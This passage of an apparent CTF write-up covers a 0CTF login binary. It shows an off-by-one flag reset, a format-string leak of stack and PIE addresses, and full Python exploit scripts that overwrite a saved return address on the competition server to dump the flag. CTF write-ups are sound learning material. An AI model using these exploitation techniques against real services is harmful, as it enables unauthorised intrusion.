<p>So we need to bypass this secret menu and make sure that the flag is set to <code>0x00</code>. As I said, <code>rax</code> points to our input, and the flag comes 256 bytes after that. It starts out as 1 and we need to make it zero&hellip; we&rsquo;re looking for an off-by-one! This is present in the <code>input username</code> function, allowing the reset of the flag and entering the secret login menu:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Login: guest
</span><span class='line'>Password: <span class="nv">guest123</span>
</span><span class='line'><span class="o">==</span> 0CTF Login <span class="nv">System</span> <span class="o">==</span>
</span><span class='line'>1. Show Profile
</span><span class='line'>2. Login as User
</span><span class='line'>3. <span class="nv">Logout</span>
</span><span class='line'><span class="o">=======================</span>
</span><span class='line'>Your choice: 2
</span><span class='line'>Enter your new username:
</span><span class='line'>HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH
</span><span class='line'>Done.
</span><span class='line'><span class="o">==</span> 0CTF Login <span class="nv">System</span> <span class="o">==</span>
</span><span class='line'>1. Show Profile
</span><span class='line'>2. Login as User
</span><span class='line'>3. <span class="nv">Logout</span>
</span><span class='line'><span class="o">=======================</span>
</span><span class='line'>Your choice: 4
</span><span class='line'>Login: root
</span><span class='line'>Password: toor
</span><span class='line'>root login failed.
</span><span class='line'><span class="m">1</span> chance remaining.
</span><span class='line'>Login: %llp
</span><span class='line'>Password: bleh
</span><span class='line'>0x7f13e2689490 login failed.
</span><span class='line'>Threat detected. System shutdown.
</span></code></pre></td></tr></table></div></figure>


<p>I won&rsquo;t show the disassembly, but just describe what happens. Locally, the binary takes the md5 of our supplied password, but compares it to <code>0ops{secret_md5}</code>. If it matches, it calls a function to dump the flag. I figured the remote binary would contain the real md5, so I needed a way to read from the process remotely. The vulnerability to do so was found soon enough, it&rsquo;s a format string vulnerability. We get two chances. I used the first to leak a stack address and an address of the binary (because of PIE, it&rsquo;s loaded at a different address each time). The second printf call is then used to leak the md5 to which our supplied password is compared.</p>

<p>Easy, right? Wrong. The remote binary returned the same string, <code>0ops{secret_md5}</code>. Obviously, I had to find another way to break this binary.</p>

<h2>The Nitty Gritty</h2>

<p>I tried overwriting a GOT pointer with the format string vulnerability, but failed: the GOT section was marked read-only! I looked for other ways to gain control of execution or making the <code>memcmp</code> succeed, but could only come up with one thing: overwriting the saved return address of the second printf call.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>11d9: lea    rsi,<span class="o">[</span>rip+0x2b5<span class="o">]</span>       <span class="p">;</span> <span class="s1">&#39;secret_MD5&#39;</span> --&gt; same remotely :?
</span><span class='line'>11e0: mov    rdi,rax
</span><span class='line'>11e3: call   b70 &lt;memcmp@plt&gt;
</span><span class='line'>11e8: <span class="nb">test   </span>eax,eax
</span><span class='line'>11ea: jne    11f8 &lt;open@plt+0x668&gt;
</span><span class='line'>11ec: mov    eax,0x0
</span><span class='line'>11f1: call   fb3 &lt;open@plt+0x423&gt;
</span><span class='line'>11f6: jmp    122e &lt;open@plt+0x69e&gt;
</span><span class='line'>11f8: lea    rax,<span class="o">[</span>rbp-0x210<span class="o">]</span>
</span><span class='line'>11ff: mov    rdi,rax
</span><span class='line'>1202: mov    eax,0x0
</span><span class='line'>1207: call   a70 &lt;<span class="nb">printf</span>@plt&gt;      <span class="p">;</span> second <span class="nb">printf </span>call<span class="p">;</span> overwrite saved ret addr using format string vuln
</span><span class='line'>120c: lea    rdi,<span class="o">[</span>rip+0x293<span class="o">]</span>        <span class="c"># 14a6 &lt;open@plt+0x916&gt;</span>
</span><span class='line'>1213: call   a90 &lt;puts@plt&gt;
</span><span class='line'>1218: lea    rdi,<span class="o">[</span>rip+0x2b1<span class="o">]</span>        <span class="c"># 14d0 &lt;open@plt+0x940&gt;</span>
</span><span class='line'>121f: call   a90 &lt;puts@plt&gt;
</span><span class='line'>1224: mov    edi,0x1
</span><span class='line'>1229: call   aa0 &lt;<span class="nb">exit</span>@plt&gt;
</span></code></pre></td></tr></table></div></figure>


<p>I found a nice, stable stack pointer that I could leak, calculated the offset to the location of the saved return address and plugged it in a poc script. Locally, it gave me the flag! I quickly tried it remotely, but it failed miserably. Turns out the layout of the stack was different; the leaked stack pointer was at a different location. Furthermore, the offset from other leaked stack addresses to the saved return address of the second printf was different. Back to the drawing board?</p>

<h2>Some luck involved</h2>

<p>I spent some time trying to locate other stack addresses that I could leak and gave me a nice, stable way to calculate the location of the saved return address. I had a way to leak the binary address, meaning I could calculate the exact return address. I then started brute-forcing stack pointers and using the second printf to dump the memory from the stack. Using this, I was looking for the correct return address. Because I was fed up with it and it was late, I had forgotten to remove a certain constant from the poc that I used locally.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">telnetlib</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">readtil</span><span class="p">(</span><span class="n">delim</span><span class="p">):</span>
</span><span class='line'>  <span class="n">buf</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;&#39;</span>
</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">e</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
</span><span class='line'>      <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">buf</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">sendln</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">b</span> <span class="o">+</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">sendbin</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">q</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;Q&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
</span><span class='line'>  <span class="k">global</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="c">#s.connect((&#39;localhost&#39;, 6666))</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;202.112.26.107&#39;</span><span class="p">,</span> <span class="mi">10910</span><span class="p">))</span>
</span><span class='line'>  
</span><span class='line'>  <span class="nb">raw_input</span><span class="p">()</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Login: &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;guest&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Password: &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;guest123&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice: &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;2&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;username:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">256</span><span class="p">)</span>        <span class="c"># overflow userflag</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice: &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>         <span class="c"># secret login menu</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c">### first format string vuln to read stack addr</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Login: &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="c"># leak both binary address and stack address</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;%1$lp-%&#39;</span><span class="o">+</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="s">&#39;$lp&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Password: &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;bleh&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;login failed.&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r&#39;([a-f0-9]{5,})&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span><span class='line'>  <span class="c"># find stack addr:</span>
</span><span class='line'>  <span class="n">stack_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>  <span class="n">base_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x1490</span>
</span><span class='line'>  
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] Leaked address of base: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">base_addr</span><span class="p">))</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] Leaked address of stack: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack_addr</span><span class="p">))</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Login: &#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;AAAAAAABBBC%10$s&#39;</span><span class="o">+</span><span class="n">q</span><span class="p">(</span><span class="n">stack_addr</span><span class="o">-</span><span class="mi">504</span><span class="p">))</span> <span class="c"># this offset of 504 was found locally and seems to be correct for remote, too</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Password: &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;bleh&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">data</span>
</span><span class='line'>  <span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;Q&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="s">&#39;AAAAAAABBBC&#39;</span><span class="p">):</span><span class="nb">len</span><span class="p">(</span><span class="s">&#39;AAAAAAABBBC&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">6</span><span class="p">]</span><span class="o">+</span><span class="n">b</span><span class="s">&quot;</span><span class="se">\x00\x00</span><span class="s">&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;you&#39;re looking for {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">base_addr</span> <span class="o">+</span> <span class="mh">0x120c</span><span class="p">))</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># check if the stack location contains the right return address</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;Q&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="s">&#39;AAAAAAABBBC&#39;</span><span class="p">):</span><span class="nb">len</span><span class="p">(</span><span class="s">&#39;AAAAAAABBBC&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">6</span><span class="p">]</span><span class="o">+</span><span class="n">b</span><span class="s">&quot;</span><span class="se">\x00\x00</span><span class="s">&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span> <span class="o">==</span> <span class="p">(</span><span class="n">base_addr</span> <span class="o">+</span> <span class="mh">0x120c</span><span class="p">):</span>
</span><span class='line'>      <span class="k">print</span> <span class="s">&quot;Found at {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</span><span class='line'>      <span class="nb">raw_input</span><span class="p">()</span>
</span><span class='line'>      
</span><span class='line'>  <span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="n">pwn</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>Note: the exact layout of the format string is chosen such that the stack address is overlapping with an actuall address on the stack. Because we can&rsquo;t send null-bytes, if we overwrite something else, the pointer would be mangled:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">before</span><span class="p">:</span> <span class="mh">0xdeadbeef</span> <span class="mh">0xcafebabe</span>
</span><span class='line'><span class="n">after</span><span class="p">:</span>  <span class="mh">0x504ddb66</span> <span class="mh">0x7fff00be</span> <span class="o">-&gt;</span> <span class="n">stack</span> <span class="n">address</span> <span class="ow">is</span> <span class="n">invalid</span><span class="p">,</span> <span class="n">pointing</span> <span class="n">to</span> <span class="mh">0xbe007fff</span><span class="o">....</span>
</span><span class='line'>
</span><span class='line'><span class="n">should</span> <span class="n">be</span><span class="p">:</span>
</span><span class='line'>
</span><span class='line'><span class="n">before</span><span class="p">:</span> <span class="mh">0xdeadbeef</span> <span class="mh">0xcafe0000</span>
</span><span class='line'><span class="n">after</span><span class="p">:</span>  <span class="mh">0x504ddb66</span> <span class="mh">0x7fff0000</span> <span class="o">-&gt;</span> <span class="n">properly</span> <span class="nb">set</span> <span class="n">stack</span> <span class="n">address</span>
</span></code></pre></td></tr></table></div></figure>


<p>Locally, I identified both the arguments 15 and 41 (in the first format string vuln) to contain the right stack address. Remotely, these contained something different. However, I simply increased the number until I hit 43: this address, combined with the offset, contained the return address! I definitely lucked out after banging my head against the challenge for a few hours.</p>

<h2>Hitting the jackpot</h2>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>python poc.py 43
</span><span class='line'>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Leaked address of base: 0x7f48589d5000
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Leaked address of stack: 0x7fffb65656b0
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Offset format string with <span class="m">24497</span> bytes
</span><span class='line'>AAAAAAABBBC
</span><span class='line'>           b.XH..TV...
</span><span class='line'>0x7f48589d620c
</span><span class='line'>you<span class="err">&#39;</span>re looking <span class="k">for</span> 0x7f48589d620c
</span><span class='line'>Found at 43
</span></code></pre></td></tr></table></div></figure>


<p>Armed with the correct stack address, I could now trivially overwrite two bytes of the saved return address so that it points to the function that read the flag and dumps it over the socket:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">telnetlib</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">readtil</span><span class="p">(</span><span class="n">delim</span><span class="p">):</span>
</span><span class='line'>  <span class="n">buf</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;&#39;</span>
</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">delim</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
</span><span class='line'>      <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">buf</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">sendln</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">b</span> <span class="o">+</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">sendbin</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">q</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;Q&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
</span><span class='line'>  <span class="k">global</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="c">#s.connect((&#39;localhost&#39;, 6666))</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;202.112.26.107&#39;</span><span class="p">,</span> <span class="mi">10910</span><span class="p">))</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c">#raw_input()</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Login: &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;guest&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Password: &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;guest123&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice: &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;2&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;username:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">256</span><span class="p">)</span>        <span class="c"># overflow userflag</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice: &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>         <span class="c"># secret login menu</span>
</span><span class='line'>  
</span><span class='line'>  
</span><span class='line'>  <span class="c">### first string format vuln to read stack addr</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Login: &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="c"># 43 found by lucky bruteforcing in combination with the 504 below. locally, it&#39;s at 15 and 41</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;%1$lp-%43$lp&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Password: &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;bleh&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;login failed.&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r&#39;([a-f0-9]{5,})&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span><span class='line'>  <span class="c"># find stack addr:</span>
</span><span class='line'>  <span class="n">stack_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>  <span class="n">base_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x1490</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># base_addr was not necesssary in the final exploit, but was </span>
